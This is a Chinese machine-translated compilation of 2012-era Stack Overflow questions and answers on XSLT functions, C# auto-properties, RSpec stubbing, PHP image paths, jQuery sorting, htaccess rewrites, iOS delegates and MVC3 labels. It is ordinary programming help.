每当我尝试使用函数 node-name() 时，以下 XSLT 转换都会显示错误。

> *错误：E[Saxon6.5.5]URI [http://www.w3.org/2005/xpath-functions](http://www.w3.org/2005/xpath-functions)未识别外部 Java 类*

```
<xsl:stylesheet version="1.1" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:xs="http://www.w3.org/2001/XMLSchema"
    xmlns:fn="http://www.w3.org/2005/xpath-functions">
<!--
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-->        

    <xsl:output method="text" />
    <xsl:variable name="in" select="/"/>
    <xsl:variable name="filter" select="document('elementsToBeLeftIn.xml')"/>

    <xsl:template match="/">
        <xsl:apply-templates select="*">
            <xsl:with-param name="f" select="$filter/*"/>
        </xsl:apply-templates>
    </xsl:template>

    <xsl:template match="*">
        <xsl:param name="f"/>
        <xsl:choose>
            <xsl:when test="$f/*">
                <xsl:copy-of select="fn:node-name()"/>

                <!--
                <xsl:for-each select="*[fn:node-name(.) = $f/*/fn:node-name(.)]">
                    <xsl:apply-templates select=".">
                        <xsl:with-param name="f" select="f/*[fn:node-name() = current()/fn:node-name()]"/>
                    </xsl:apply-templates>
                </xsl:for-each>
                -->
            </xsl:when>
            <xsl:otherwise>
                <xsl:copy-of select="."/>
            </xsl:otherwise>
        </xsl:choose>
    </xsl:template>

</xsl:stylesheet> 
```

谢谢大卫。**这就是我真正想做的工作**（它是递归的）。使用`name()`我仍然得到错误`*Unexpected tocken [<function>] in path expression*`。

在你之后

```
<xsl:stylesheet version="1.1" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:xs="http://www.w3.org/2001/XMLSchema"
    xmlns:fn="http://www.w3.org/2005/xpath-functions">
<!--
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-->        

    <xsl:output method="text" />
    <xsl:variable name="in" select="/"/>
    <xsl:variable name="filter" select="document('elementsToBeLeftIn.xml')"/>

    <xsl:template match="/">
        <xsl:apply-templates select="*">
            <xsl:with-param name="f" select="$filter/*"/>
        </xsl:apply-templates>
    </xsl:template>

    <xsl:template match="*">
        <xsl:param name="f"/>
        <xsl:choose>
            <xsl:when test="$f/*">
                <xsl:for-each select="*[name() = $f/*/name()]">
                    <xsl:apply-templates select=".">
                        <xsl:with-param name="f" select="f/*[name() = current()/name()]"/>
                    </xsl:apply-templates>
                </xsl:for-each>
            </xsl:when>
            <xsl:otherwise>
                <xsl:copy-of select="."/>
            </xsl:otherwise>
        </xsl:choose>
    </xsl:template>

</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:02:42.680

即使在 XSLT2 中，您也不需要像 node-name() 这样的标准函数前缀。但是您使用的是 XSLT1 的 saxon 6，因此您不能为函数添加前缀，否则它们将永远不会被识别。（XPath 1 标准函数不在命名空间中）

只需使用`select="name()"`

但是我不认为你的代码会像你期望的那样工作（但你没有说你想要它做什么）但它只会将模板应用于一个元素（顶级文档元素），因为模板永远不会递归应用.

在过滤器测试为真的情况下，`<xsl:copy-of select="name()"`将输出该元素的名称，没有标记（因此结果将不是格式良好的 xml）。

在过滤器测试为假的情况下，整个文档元素（包括其所有子元素）将被复制到输出中，并且不会进行进一步的处理。

```
$f/*/name() 
```

在 XPath2 中是合法的，但在 XPath 1 中不合法，其中使用的路径表达式`/`只能使用不以返回字符串的函数结尾的节点。不确定您想要做什么，因此无法立即更换。

```
 current()/name() 
```

可以写成

```
 name(current()) 
```

在 XPath 1 中。

但是，既然您使用的是 saxon java 实现，为什么不简单地使用 saxon 9 而不是 saxon 6 并从 xslt 引擎十多年的进一步开发中受益呢？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:26:21.287

Saxon 6.5.5 是一个 XSLT 1.0 引擎。命名空间[http://www.w3.org/2005/xpath-functions](http://www.w3.org/2005/xpath-functions)适用于 XPATH 2.0、XSLT 2.0 和 XSLT 3.0。XSLT 1.0 无法识别此名称空间。这就是您收到错误的原因。

没有与[http://www.w3.org/2005/xpath-functions](http://www.w3.org/2005/xpath-functions)等效的 XSLT 1.0 。只需调用没有前缀的函数。

# c# - 自动生成 instvar 有什么意义？

> ID：11651222
> 
> 赞同：0
> 
> 时间：2012-07-25T13:48:08.027
> 
> 标签：c#, properties, auto-generate

从 C# 3.0 开始，有新的语法可以从属性自动生成实例变量：

```
public string Foo { get; set; } 
```

但是没有办法访问底层的支持字段。所以我真的不明白它的意义，因为声明相同的实例变量会产生相同的效果，而无需调用“getter”和“setter”的开销。

```
public string Foo; 
```

像这样声明属性：

```
public string Foo { get; } 
```

或者

```
public string Foo { set; } 
```

完全没用，因为我们无法编写相应的代码。阅读该字段的内容。

有人能很好地解释为什么在 C# 中他们付出了所有努力来引入这种语法糖吗？

编辑：人们似乎认为我混淆了字段和属性，所以让我澄清一下我所说的话。

如果您使用具有自动生成字段的属性：

```
public string Foo { get; set; } 
```

那么就没有意义了，因为每当您访问属性时，每次访问属性时都会对`get_Foo()`“getter”进行开销调用，并且由于您没有在“getter”中做任何特别的事情，所以没有糊状创建此属性的兴趣。创建字段将完全相同，并且速度更快（优化）。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T13:50:01.260

`public string Foo { get; set; }`定义一个属性。
`public string Foo;`定义一个字段。

它们是不同的东西。当你真正想要一个属性而不是一个字段时，前者非常方便。

至于访问，您可以定义不同的访问级别：

```
public string Foo { get; private set; } 
```

另请参阅[C# 3.0+ 中属性和字段之间的区别](https://stackoverflow.com/questions/653536/difference-between-property-and-field-in-c-sharp-net-3-5)

* * *

至于您的编辑，您所说的只有在以下情况下才有意义：

1.  您 100% 确定您的属性访问器永远不会包含任何实际逻辑。
2.  您 100% 确定您的字段永远不会被数据绑定。

如果上述任何一项不正确，那么您需要定义一个属性，即使该属性看起来像一个空存根。
然后，当您稍后决定向访问器添加逻辑时，您不会破坏所有依赖您的字段作为字段的客户端。
如果你的类可能是数据绑定的，你需要一个属性，因为数据绑定机制会忽略字段。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-25T13:50:57.753

```
public string Foo; 
```

是一个字段。

```
public string Foo { get; set; } 
```

是一种财产。它们不是同一个东西，之前[已经](https://stackoverflow.com/questions/653536/difference-between-property-and-field-in-c-sharp-net-3-5) [讨论](http://www.codinghorror.com/blog/2006/08/properties-vs-public-variables.html)[过](https://stackoverflow.com/questions/295104/what-is-the-difference-between-a-field-and-a-property-in-c-sharp) 。主要传播的优点之一是访问控制：经常用作示例。`get; private set;`

> 但是没有办法访问底层的支持字段。

是的，通过调用吸气剂。`[this.]Propertyname`当您想在本地访问它时使用。

* * *

```
public string Foo { get; } 
```

和

```
public string Foo { set; } 
```

会给你编译器错误，因为你必须同时实现`get`和`set`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-25T13:50:11.253

这样做的目的是使代码更简洁，减少输入。

在您的示例中：

```
public string Foo; 
```

是一个字段，与属性不同：

```
public string Foo { get; set; } 
```

所以 auto-property 语法是有用的，在某种程度上相当于：

```
private string _foo;
public string Foo { get { return _foo; } set { _foo = value; } } 
```

但是它不会创建好的名称，它使用在 C# 中无效的安全名称（但在 IL 中有效）。

尽管在技术上是可能的，但属性开销通常由 JIT 解决，以直接访问字段。

属性通常也是大多数数据绑定框架的目标。在反射中，属性不同于字段。WPF / WinForms 数据绑定使用属性（不是公共字段）。大多数属性使用支持字段来存储数据。权衡是在课堂上时，您仍然使用属性而不是使用支持字段。实际上，在发布优化代码上，性能与 JIT 将它们解析为完全相同的东西完全相同**。**

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-25T13:51:18.220

它本身没有意义，但你可以这样做：

```
public string Foo { private set; get; } 
```

这有更多的价值。

属性和字段也不是一回事。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-25T13:52:13.470

它使定义属性更快，代码更简洁。如果您不需要属性，则不要定义一个 - 但我建议不要使用`public`字段。您可以创建属性`private`并访问它除了返回 IL 定义的字段之外没有任何作用。此外，如果您需要在`get`or中做一些工作，`set`那么您将不得不以某种方式定义一个支持值，无论是一个字段还是某个继承的成员。

# ruby-on-rails-3 - 如何在视图规范中存根或模拟 authlogic current_user

> ID：11651232
> 
> 赞同：1
> 
> 时间：2012-07-25T13:48:34.877
> 
> 标签：ruby-on-rails-3, authlogic, rspec-rails

我正在尝试为我的 rails 应用程序编写一些视图规范，但我偶然发现了这个错误：

```
ActionView::Template::Error:
       undefined local variable or method `current_user' for #<#<Class:0x007fa47d2612d0>:0x007fa47e267710> 
```

这是我编写视图规范的方式：

```
describe "/newsletters/index.html.erb" do
  include NewslettersHelper
  include Authlogic::TestCase

  def current_user(stubs = {})
    @current_user ||= mock_model(User, stubs)
  end

  def user_session(stubs = {}, user_stubs = {})
    @current_user_session ||= mock_model(UserSession, {:user => current_user(user_stubs)}.merge(stubs))
  end

def login(session_stubs = {}, user_stubs = {})
    UserSession.stub!(:find).and_return(user_session(session_stubs, user_stubs))
  end

 def logout
    @user_session = nil
  end

context "without a logged-in user" do
    before(:each) do
      activate_authlogic
      logout()
      assigns[:newsletters] = @newsletters = [ mock_model(Newsletter, :titre => "value for titre",
       :sommaire => "value for sommaire", :content => "value for content") ]
    end

it "renders a list of newsletters" do
  # pending("find how to mock authlogic current user in views spec")
  render
  rendered.should have_selector("tr>td") do |row|
    row.should have_content("value for titre")
  end
  rendered.should have_selector("tr>td") do |row|
    row.should have_content("value for sommaire")
  end
  rendered.should have_selector("tr>td") do |row|
    row.should have_content("value for content")
  end
end 
```

结尾

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T13:57:18.617

试试`controller.stub(:current_user) { mock_model(User) }` 我觉得应该有帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-03T09:28:01.347

视图规范是一个孤立的上下文，因此您需要在视图上下文中存根 current_user 方法。

```
view.stub(:current_user).and_return(mock_model(User)) 
```

为了进一步阅读**视图规范**，我建议你在津津乐道的[视图规范页面](https://www.relishapp.com/rspec/rspec-rails/v/2-14/docs/view-specs/view-spec#passing-view-spec-that-stubs-a-helper-method)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-08-10T01:01:51.340

没有一个答案对我有用（在这里使用 rspec 3.9），因为我遇到了错误`#<#<Class:0x007fb9ca387dc8> does not implement: current_user`，试图存根视图或控制器对象，所以我不得不这样做：

```
 before do
    controller.singleton_class.class_eval do
      # Just defining methods to being stubbed later
      def current_user; end
      def current_account; end
      helper_method :current_user, :current_account
    end
    allow(controller).to receive(:current_user).and_return(user)
    allow(controller).to receive(:current_account).and_return(account)
  end 
```

不是最漂亮的解决方案，但它有效。

# php - 图片未显示

> ID：11651234
> 
> 赞同：0
> 
> 时间：2012-07-25T13:48:48.357
> 
> 标签：php

我已经使用此代码将图像从数据库访问到网页。但调试后图像标签中没有图像。

此代码打印正确的路径....但无法在图像标签中返回正确的图像...

```
echo $_SESSION['user_image']; 
```

如何在图像标签中获取图像？请帮助我。

```
 while($row = mysql_fetch_assoc($result))
    {

    $_SESSION['user_id']    = $row['user_id'];
    $_SESSION['user_name']  = $row['user_name'];
    $_SESSION['user_level'] = $row['user_level'];
    //$_SESSION['user_image'] = $row['image'];
    $image=$row['image'];

    $user_image= trim('C:/xampp/htdocs/source/img/' . $image);
    //$user_image = imagecreatefromstring($user_image);
    $_SESSION['user_image']=$user_image;
    echo $_SESSION['user_image'];
    }
    echo "<img src='".$row['image']."'>";
    echo 'Welcome, <img src= "'.$_SESSION['user_image'].'" alt="" width="50"     
    height="40" /> ' . $_SESSION['user_name'] . '. <br /><a href="index.php">Proceed to  
    the forum overview</a>.'; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:28:44.530

您正在使用服务器中的本地路径。

```
'C:/xampp/htdocs/source/img/' . $image 
```

应该

```
'/source/img/' . $image 
```

# delphi - Delphi 增量链接器是否正确跟踪不同的类型？

> ID：11651240
> 
> 赞同：0
> 
> 时间：2012-07-25T13:48:57.357
> 
> 标签：delphi, compiler-construction, linker

具有相同标识（TLevel 和整数）的类型的示例

```
unit UnitType;

interface

type
  TLevel = integer;

  TObj = class
  public
    procedure Test(Level: TLevel);virtual;
  end; 
```

还有另一个单元，另一个对象从这个对象继承（注意整数而不是 TLevel，但这不是问题，因为它们不是不同的）

```
unit UnitOther;

interface uses UnitType;

type
  TInhObj = class(TObj)
  public
    procedure Test(Level: integer);override;
  end; 
```

一切都照常编译。

现在我将 TLevel 类型修改为不同的

```
TLevel = type integer; 
```

并尝试编译，但一切编译正常。

我去 UnitOther 并更改一些不相关的内容（甚至只是重新保存它）。现在我在 UnitOther 单元中有“测试声明不同于以前的声明”

这是正确的操作还是在最新版本的 Delphi 中修复的错误？（我的是5）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:11:44.567

我正在使用 Delphi XE，它的行为仍然与您描述的完全一样。一种解决方法是定期运行 Build 事件（即在您提交代码之前）。这不是一个非常有说服力的解决方案，但至少它允许检测到更改的类型，而无需触及所有使用它的文件。

# javascript - 按 ID 对图像进行排序

> ID：11651241
> 
> 赞同：0
> 
> 时间：2012-07-25T13:49:06.670
> 
> 标签：javascript, jquery, html, sorting

> **可能重复：**
> [如何根据 ID 对 LI 进行排序](https://stackoverflow.com/questions/3630397/how-to-sort-lis-based-on-their-id)

我有一个动态填充各种图像的 div，看起来像：

```
<div id="images">
<img id="img1" src="..." />
<img id="img3" src="..." />
<img id="img2" src="..." />
<img id="img6" src="..." />
<img id="img5" src="..." />
<img id="img4" src="..." />
</div> 
```

使用 javascript 和 jQuery，我需要将图像按 ID 顺序排序，但我很挣扎。这是我到目前为止所得到的：

```
var toSort = $('#images').children;
toSort = Array.prototype.slice.call(toSort,0);

toSort.sort(function(a,b){
   var aord = +a.id.substr(6);
   var bord = +b.id.substr(6);  
   return aord - bord; 
});

var parent = $('#images');
parent.innerHTML="";
for(var i=0, l = toSort.length; i<l; ++i){
   parent.appendChild(toSort[i]);
} 
```

我离我有多近？我究竟做错了什么？多谢你们。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T13:53:15.903

```
var imgs = $('#images img');
imgs.sort(function(a, b) {
   return a.id > b.id;
});
$('#images').html(imgs);
​ 
```

**[演示](http://jsfiddle.net/CY46R/4/)**

**或者**

```
var imgs = $('#images img');
imgs.sort(function(a, b) {
   return +a.id.replace('img','') -  +b.id.replace('img','');
});
$('#images').html(imgs); 
```

**[演示](http://jsfiddle.net/CY46R/6/)**

带有您的代码的版本：

```
var parent = $('#images'),
    children = parent.children(),
    toSort = Array.prototype.slice.call(children, 0);

parent[0].innerHTML = ""; //or parent.empty();

toSort.sort(function(a, b) {
    var aord = +a.id.substr(3);
    var bord = +b.id.substr(3);
    return aord - bord;
});

for (var i = 0; i < toSort.length; i++) {
    parent.append(toSort[i]);
} 
```

**[演示](http://jsfiddle.net/5JTQn/3/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T13:55:22.273

```
var elem = $('#images'),
    imgs = elem.find('img');
imgs.sort(function(a, b) {
   return a.id.toUpperCase().localeCompare(b.id.toUpperCase());
});
$.each(imgs, function(idx, itm) { elem.append(itm); }); 
```

[小提琴](http://jsfiddle.net/GgnF3/4/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:03:12.340

我认为@thecodeparadox 版本更好，但这里是您的代码更正了一点。我将 img 更改为 span 以使其更明显。

[http://jsfiddle.net/whnyn/](http://jsfiddle.net/whnyn/)

# .htaccess - 从 htaccess 中的 URL 中删除不需要的字符

> ID：11651243
> 
> 赞同：3
> 
> 时间：2012-07-25T13:49:09.170
> 
> 标签：.htaccess, mod-rewrite, replace

我们当前的 htaccess 设置正确地将这样的 url 转换为：site.com/page.php?sid=Friend 到 site.com/Friend

然而，由于不相关的疏忽，我们几乎所有的 URL 都被双索引为 site.com/Friend> 因为大于号是一个特殊字符，它不会调用 page.php，所以需要去掉 >在 htaccess 中，不能在 page.php 上完成。更复杂的是，它们的索引方式是：site.com/Friend%3E，它也可能需要被删除。

我们想要的是有另一个指令来查找 > （或 %3E）的结尾，将其剥离，然后重定向到没有该结尾的变量 > 本质上是这样 site.com/Friend> （或 site .com/Friend%3E) 仍然指向 site.com/Friend

感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-26T06:55:53.363

将此添加到规则的顶部：

```
RewriteRule ^/?(.*)>$ /$1 [L,R=301] 
```

您可以使用`>`，因为 URI 在`RewriteRule`.

# iphone - UIButton 子类委托方法的问题

> ID：11651245
> 
> 赞同：0
> 
> 时间：2012-07-25T13:49:15.937
> 
> 标签：iphone, properties, methods, delegates, subclass

这是情况。我有一个名为“MyViewController”的视图控制器。在这个视图控制器中，我有一个使用子类按钮的文本编辑功能。UIButton 子类的名称是“ColorSwatch”

我在“ColorSwatch.h”子类中设置了委托/协议方法，如下所示。

```
//  ColorSwatch.h

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <QuartzCore/QuartzCore.h>

@protocol ColorSwatchDelegate <NSObject>
- (void)fontColor:(UIColor *)color;
@end

@interface ColorSwatch : UIButton {
id <ColorSwatchDelegate> colorSwatchDelegate;
    CAGradientLayer *gradient;
    UIView *currentView;
    UIColor *fontColor;
}

@property (nonatomic, retain) id <ColorSwatchDelegate> colorSwatchDelegate;
@property (nonatomic, retain) CAGradientLayer *gradient; 
@property (nonatomic, retain) UIView *currentView;
@property (nonatomic, retain) UIColor *fontColor;

@end 
```

现在在我的“ColorSwatch.m”中，我有：

```
//  ColorSwatch.m

#import "ColorSwatch.h"
#import <QuartzCore/QuartzCore.h>
#import "MyViewController.h"

@implementation ColorSwatch

@synthesize gradient; 
@synthesize currentView;
@synthesize colorSwatchDelegate;
@synthesize fontColor;

-(void)setupView{
    "Makes the subclassed buttons pretty"
}

-(id)initWithFrame:(CGRect)frame{
    if((self = [super initWithFrame:frame])){

    }

    return self;
}

-(id)initWithCoder:(NSCoder *)aDecoder{
    if((self = [super initWithCoder:aDecoder])){
        [self setupView];
        MyViewController *mvc = [[MyViewController alloc] initWithNibName:
                                           @"MyViewController" bundle:nil];
        self.colorSwatchDelegate = mvc;
    }

    return self;
}

-(void) touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event {
    [self magnify:view];
    fontColor = view.backgroundColor;
    [self.colorSwatchDelegate fontColor:fontColor];
}

- (void)magnify:(UIView *)view
{

}

- (void)dealloc
{
    [currentView release];
    [gradient release];
    [fontColor release];

    [super dealloc];
}

@end 
```

在“MyViewController.h”中，我有：

```
//  MyViewController.h

#import <UIKit/UIKit.h>
#import <QuartzCore/QuartzCore.h>
#import "ColorSwatch.h"

@interface MyViewController : UIViewController <ColorSwatchDelegate> {    

UITextField *photoLabelTextField;

}

@property (nonatomic, retain) IBOutlet UITextField *photoLabelTextField;

@end 
```

在“MyViewController.m”中，我有：

```
- (void)fontColor:(UIColor *)color
{
    NSLog(@"Selected Font Color");
    [self.photoLabelTextField setTextColor:color];
} 
```

现在委托方法有点工作，这意味着当我点击颜色按钮时

```
NSLog(@"Selected Font Color"); 
```

消息被触发。但问题是我无法改变

```
[self.photoLabelTextField setTextColor:color]; 
```

财产。我尝试了多种更改属性的方法，我唯一能做的就是发送 NSLogs，我尝试更改“MyViewController”类中的属性的任何事情都没有任何反应。

如果有人可以帮助我，我将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:40:10.943

问题是 ColorSwatch 正在将委托消息发送到 MyViewController 的悬空实例，它在 initWithCoder: 方法中错误地分配了该实例。

UIControls 不应该将 ViewControllers 分配为它们的代表......它反过来。

删除这些行...

```
// in ColorSwatch.m initWithCoder:
MyViewController *mvc = [[MyViewController alloc] initWithNibName:
                                           @"MyViewController" bundle:nil];
self.colorSwatchDelegate = mvc; 
```

然后，在 MyViewController.m ...

```
- (void)viewDidLoad {

    ColorSwatch *colorSwatchButton = [[ColorSwatch alloc] buttonWithType:UIButtonTypeCustom];

    // or place a ColorSwatch in the xib, on MyViewController's view... But not before you
    // you delete lines from initWithCoder, otherwise it's infinite circular allocation

    colorSwatchButton.frame = CGRectMake(/* ... */);
    colorSwatchButton addTarget:self action:@selector(csButtonPressed:) forControlEvent: UIControlEventTouchUpInside];
    // and so on...
    // now the important part:
    colorSwatchButton.colorSwatchDelegate = self;

    // see - the ViewController is in charge of allocation, sets itself up as the delegate
    [self.view addSubview:colorSwatchButton];
} 
```

您可以使用 IB，而不是在代码中构建按钮。

第 1 步：让代表成为一个出口......

```
@property (nonatomic, retain) IBOutlet id <ColorSwatchDelegate> colorSwatchDelegate; 
```

第二步：在 IB 中绘制按钮，并将它们的类设置为 ColorSwatch。然后可以跳过我在viewDidLoad中写的代码。

第 3 步：新放置的按钮现在应该在 IB 中显示一个出口。您可以像往常一样将其拖到 MyViewController 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:03:14.463

您的 IBOutlet 中可能存在连接问题`photoLabelTextField`，您可能忘记将`xib`文本字段与您的`photoLabelTextField`

# javascript - IE8中js模块之间的通用数据

> ID：11651246
> 
> 赞同：0
> 
> 时间：2012-07-25T13:49:21.493
> 
> 标签：javascript, jsp, internet-explorer-8

我有一个由几个 jsp 文件组成的 web 应用程序，其中几个使用了常见的 jscript 模块。我的问题是我在访问 IE8 中 jscript 模块之间的公共数据时遇到了困难。

例如 - 在 jsp 文件中：

```
<script for="window" event="onload">
// My globals.
myGlobals = new Object();
// Attach it to the window for maximum availability.
window.myGlobals = myGlobals;
// Add some fields to it.
// List is actually built from external data so cannot be included from external file.
myGlobals.filters = [
'Filter-Women',
'Filter-Men',
'Filter-Girls',
'Filter-Boys',
];
myGlobals.filtered = '';
</script> 
```

并在一个单独的 js 文件中：

```
function filter(f) {
  for (var i = 0;i < myGlobals.filters.length;i++){
    if ( 'Filter-'+f == myGlobals.filters[i] ) {
      filterIn(document.getElementById(myGlobals.filters[i]));
    } else {
      filterOut(document.getElementById(myGlobals.filters[i]));
    }
  }
  myGlobals.filtered = f;
}

function filterIn(e) {
  e.classList.add('filterselected');
}

function filterOut(e) {
  e.classList.remove('filterselected');
} 
```

在我的 jsp 中 - 该列表也是由与上面相同的外部数据构建的：

```
<div class="filterbuttons">
<a id="Filter-Women" onclick="filter('Women')">WOMEN</a>
<a id="Filter-Men" onclick="filter('Men')">MEN</a>
<a id="Filter-Girls" onclick="filter('Girls')">GIRLS</a>
<a id="Filter-Boys" onclick="filter('Boys')">BOYS</a>
</div> 
```

现在这一切在 Firefox 中运行良好，但客户也需要在 IE8 中运行。在那里，myGlobals 结构不可用，甚至在窗口中也不可用。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:17:31.823

问题解决了！

改变：

```
<script for="window" event="onload"> 
```

简单地说：

```
<script> 
```

一切正常。

# asp.net-mvc-3 - 如何在 mvc3 的 razor 中更改 LabelFor 的显示名称？

> ID：11651254
> 
> 赞同：89
> 
> 时间：2012-07-25T13:49:39.670
> 
> 标签：asp.net-mvc-3, html-helper

在剃须刀引擎中，我使用`LabelFor`了辅助方法来显示名称

但是显示名称似乎不好显示。所以我需要更改我的显示名称怎么做....

```
@Html.LabelFor(model => model.SomekingStatus, new { @class = "control-label"}) 
```

* * *

## 回答 #1

> 赞同：164
> 
> 时间：2012-07-25T13:53:02.743

您可以使用属性装饰您的视图模型`[DisplayName]`属性并指定要使用的文本：

```
[DisplayName("foo bar")]
public string SomekingStatus { get; set; } 
```

或者使用 LabelFor 帮助器的另一个重载，它允许您指定文本：

```
@Html.LabelFor(model => model.SomekingStatus, "foo bar") 
```

而且，不，你不能像你试图做的那样在 MVC3 中指定一个类名，因为`LabelFor`助手不支持它。但是，这适用于 MVC4 或 5。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2015-07-24T10:40:27.107

这是一个老问题，但现有答案忽略了在重新生成模型时丢弃任何自定义属性的严重问题。我正在添加更详细的答案以涵盖当前可用的选项。

## 您有 3 个选项：

*   将`[DisplayName("Name goes here")]`属性添加到数据模型类。不利的一面是，每当您重新生成数据模型时，它都会被丢弃。
*   将字符串参数添加到您的`Html.LabelFor`. 例如`@Html.LabelFor(model => model.SomekingStatus, "My New Label", new { @class = "control-label"})`参考：[https](https://msdn.microsoft.com/en-us/library/system.web.mvc.html.labelextensions.labelfor(v=vs.118).aspx) ://msdn.microsoft.com/en-us/library/system.web.mvc.html.labelextensions.labelfor(v= vs.118).aspx 这样做的缺点是您必须重复标签在每个视图中。
*   第三种选择。使用附加到数据类的元数据类（详细信息如下）。

## 选项 3 - 添加元数据类：

Microsoft 允许在实体框架类上装饰属性，**而无需修改现有类**！这是通过将元数据类附加到您的数据库类（实际上是您的 EF 类的横向扩展）来实现的。这允许将属性添加*到关联的类*而不是类本身**，这样在重新生成数据模型时更改不会丢失**。

例如，如果你的数据类`MyModel`有一个`SomekingStatus`属性，你可以这样做：

首先声明一个同名的*部分类（并使用相同的命名空间），它允许您添加一个类属性而不被覆盖：*

```
[MetadataType(typeof(MyModelMetaData))]
public partial class MyModel
{
} 
```

所有生成的数据模型类都是部分类，它允许您通过简单地创建更多同名的类来添加额外的属性和方法（这非常方便，我经常使用它来提供模型中其他字段类型的格式化字符串版本）。

第 2 步：添加新部分类引用的元数据类：

```
public class MyModelMetaData
{
    // Apply DisplayNameAttribute (or any other attributes)
    [DisplayName("My New Label")]
    public string SomekingStatus;
} 
```

**参考：** [https ://msdn.microsoft.com/en-us/library/system.componentmodel.dataannotations.metadatatypeattribute(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/system.componentmodel.dataannotations.metadatatypeattribute(v=vs.110).aspx)

## 笔记：

*   从内存中，如果您开始使用元数据类，它可能会忽略实际类（`[required]`等）上的现有属性，因此您可能需要在元数据类中复制这些属性。
*   这不是靠魔法操作的，也不仅仅适用于任何类。查找 UI 装饰属性的代码旨在首先查找元数据类。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2012-07-25T13:52:21.317

您可以通过使用属性装饰属性来更改标签的文本`DisplayName`。

```
[DisplayName("Someking Status")]
public string SomekingStatus { get; set; } 
```

或者，您可以显式编写原始 HTML：

```
<label for="SomekingStatus" class="control-label">Someking Status</label> 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-07-25T13:53:02.733

使用 DisplayName 属性装饰模型属性。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-11-08T12:09:36.143

@Html.LabelFor(model => model.SomekingStatus, "foo bar")

# php - 显示/隐藏带有总计的动态表列

> ID：11651255
> 
> 赞同：1
> 
> 时间：2012-07-25T13:49:41.863
> 
> 标签：php, javascript

下午好，在我的 php/mysql 页面中，我有动态表，每行都有一行。我使用了显示/隐藏脚本来隐藏某些列，这很好，但我真的希望在隐藏列时更新行总数，在下面的示例中，如果我隐藏说 Jan 它应该扣除该列行中的值并更新总列？

这是js；

```
<script type="text/javascript" src="../js/prototype.js"></script>

<script language="javascript">
function toggleVis(button) { 
  // Toggle column 
  cells = $$('.t'+button.name); 
  cells.invoke(button.checked ? 'show' : 'hide'); 

  // Recaulculate total 
  $$('tr.row').each(function(row) { 
    // Initialise to zero 
    var total = 0; 
    row.down('.total').textContent = total; 

    // Sum all visible cells 
    row.select('td').each(function(cell) { 
      total += cell.visible() ? parseInt(cell.textContent, 10) : 0;
    }); 

    // Write the total in the total cell 
    row.down('.total').textContent = total; 
  }); 
}
</script> 
```

以及动态表格+表格隐藏列；

```
<form name="tcol" onsubmit="return false">
  Show columns
  <input type=checkbox name="col1" onclick="toggleVis(this.name)" checked> 1
  <input type=checkbox name="col2" onclick="toggleVis(this.name)" checked> 2
  <input type=checkbox name="col3" onclick="toggleVis(this.name)" checked> 3
</form>

<table border="1" cellpadding="1" cellspacing="1">
  <tr>
    <td class="tcol1">Adviser</td>
    <td class="tcol2">Jan</td>
    <td class="tcol3">Feb</td>
    <td class="total">Total</td>
  </tr>
  <?php do { ?>
    <tr class="row">
      <td class="tcol1"><?php echo $row_Recordset1['Adviser']; ?></td>
      <td class="tcol2"><?php echo $row_Recordset1['Jan'    ]; ?></td>
      <td class="tcol3"><?php echo $row_Recordset1['Feb'    ]; ?></td>
      <td class="total"><?php echo $row_Recordset1['Total'  ]; ?></td>
    </tr>
    <?php } while ($row_Recordset1 = mysql_fetch_assoc($Recordset1)); ?>
</table> 
```

非常感谢您的关注。。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:07:47.443

然后，您必须在切换列之后使用 Javascript 解析您的表。

最简单的方法是给每一行和每个单元格一个类。注意不要为您的单元格使用 id，因为它们不会是唯一的。也不要使用名称，因为它们更专注于表单和输入。

```
<tr class="row">
  <td class="tcol1"><?php echo $row_Recordset1['Adviser']; ?></td>
  <td class="tcol2"><?php echo $row_Recordset1['Jan'    ]; ?></td>
  <td class="tcol3"><?php echo $row_Recordset1['Feb'    ]; ?></td>
  <td class="total"><?php echo $row_Recordset1['Total'  ]; ?></td>
</tr> 
```

然后您将解析您的行和单元格，如下所示（[prototype.js](/questions/tagged/prototype.js "显示标记为“prototype.js”的问题")样式）：

```
$$('tr.row').each(function(row) {
  // Initialise to zero
  var total = 0;
  row.down('.total').textContent = total;

  // Sum all visible cells
  row.select('td').each(function(cell) {
     total += cell.visible() ? parseInt(cell.textContent) : 0;
  });

  // Write the total in the total cell
  row.down('.total').textContent = total;
}); 
```

那应该行得通。

您可以使用其他 JS 框架（如[jquery](/questions/tagged/jquery "显示标记为“jquery”的问题") ）编写模拟代码，不用说，如果没有任何框架，它会变得不那么简单。

* * *

## 回答 #2
